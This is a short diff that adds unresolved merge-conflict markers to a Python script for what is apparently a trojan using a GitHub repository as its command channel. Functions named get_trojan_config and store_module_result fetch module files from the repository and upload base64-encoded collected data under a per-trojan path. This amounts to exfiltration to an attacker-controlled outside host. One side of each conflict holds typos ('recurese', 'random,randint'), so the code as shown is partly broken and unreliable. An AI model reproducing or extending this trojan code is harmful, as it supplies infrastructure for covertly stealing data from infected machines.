@@ -28,7 +28,11 @@ def connect_to_github():
 def get_file_contents(filepath):
 
     gh,repo,branch =connect_to_github()
+<<<<<<< HEAD
     tree = branch.commit.commit.tree.recurse()
+=======
+    tree = branch.commit.commit.tree.recurese()
+>>>>>>> ec08fbc8dc7e1d085efb8b062a73f24157c7275a
 
     for filename in tree.tree:
         if filepath in filename.path:
@@ -53,7 +57,11 @@ def get_trojan_config():
 def store_module_result(data):
 
     gh,repo,branch = connect_to_github()
+<<<<<<< HEAD
     remote_path = "data/%s/%d/data"% (trojan_id,random.randint(100,100000))
+=======
+    remote_path = "data/%s/%d/data"% (trojan_id,random,randint(100,100000))
+>>>>>>> ec08fbc8dc7e1d085efb8b062a73f24157c7275a
     repo.create_file(remote_path,"Commit message",base64.b64encode(data))
 
     return
